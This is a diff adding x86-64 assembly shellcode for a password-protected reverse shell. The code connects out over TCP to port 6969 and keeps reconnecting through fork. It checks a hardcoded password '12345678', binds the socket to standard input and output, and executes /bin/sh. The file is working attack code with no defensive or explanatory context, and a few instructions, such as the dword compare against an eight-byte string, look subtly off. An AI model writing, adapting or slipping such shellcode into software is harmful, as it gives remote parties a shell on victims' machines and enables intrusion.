@@ -1,0 +1,106 @@
+[bits 64]
+
+_start:
+; store stack
+    push rsp
+    pop r8
+    
+; socket(AF_INET, SOCK_STREAM, 0);
+    push 41        ; sys_socket
+    push 0         ; N/A
+    push 1         ; SOCK_STREAM
+    push 2         ; AF_INET
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rax
+    syscall
+    push rax
+    push rax
+
+; connect(s, (sockaddr *) &addr,0x10);
+    pop rdi
+    pop r9
+; make some space
+    xor rdx, rdx
+    push rdx
+    push rdx
+; generate sockaddr struct
+    ; IP = 0.0.0.0
+    mov word [rsp + 2], 0x391b      ; PORT = 6969
+    mov byte [rsp],  2              ; AF_INET
+    push rsp
+    pop rsi
+    push 0x10
+    pop rdx
+    push 42
+    pop rax
+    syscall
+; check success
+    cmp rax, 0
+    jne cleanup
+
+; fork(void)
+    push 57
+    pop rax
+    syscall
+    cmp rax, 1
+    jge _start
+
+; check password
+; read(s, &buf, 8)
+    xor rdx, rdx
+    push rdx
+    pop rax
+    push r9
+    pop rdi
+    push r8
+    pop rsi
+    push 8
+    pop rdx
+    syscall
+    cmp dword [r8], "12345678"
+    jne exit
+
+; dup2(s,i);
+    push 3
+    pop rsi
+loop:
+; sys_dup2
+    dec rsi
+    push 33
+    pop rax
+    syscall
+    jne loop
+ 
+client:
+; execve(SHELLPATH,{SHELLPATH,0},0);
+    push rsi
+    pop rdx
+    push rsi
+    mov rdi, "/bin/sh"
+    push rdi
+    push rsp
+    pop rdi
+    push 59
+    pop rax
+    syscall
+ 
+cleanup:
+; close(%ebx)
+    push 3
+    pop rax
+    push r9
+    pop rdi
+    syscall
+; restore stack
+    push r8
+    pop rsp
+    jmp _start
+    
+
+exit:
+; exit(0);
+    push 60
+    pop rax
+    syscall
